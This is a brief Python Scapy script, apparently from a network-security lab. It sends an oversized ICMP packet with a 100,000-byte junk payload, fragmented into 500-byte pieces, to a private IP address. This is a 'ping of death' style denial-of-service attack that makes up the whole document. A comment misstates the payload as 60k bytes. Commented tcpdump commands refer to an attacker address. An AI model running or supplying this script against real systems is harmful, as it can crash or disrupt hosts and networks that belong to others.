#!/usr/bin/python

from scapy.all import *
dip="192.168.1.196"

ip_hdr = IP(dst=dip)
packet = ip_hdr/ICMP()/("m"*100000) #send 60k bytes of junk

frags=fragment(packet,fragsize=500)

counter=1
for fragment in frags:
  print "Packet no "+str(counter)
  print "==================================================="
  fragment.show() #displays each fragment
  counter+=1
  send(fragment)

#sudo tcpdump -B 20000 -p -v -nn
#sudo tcpdump -i enp0s3 -v attacker-address
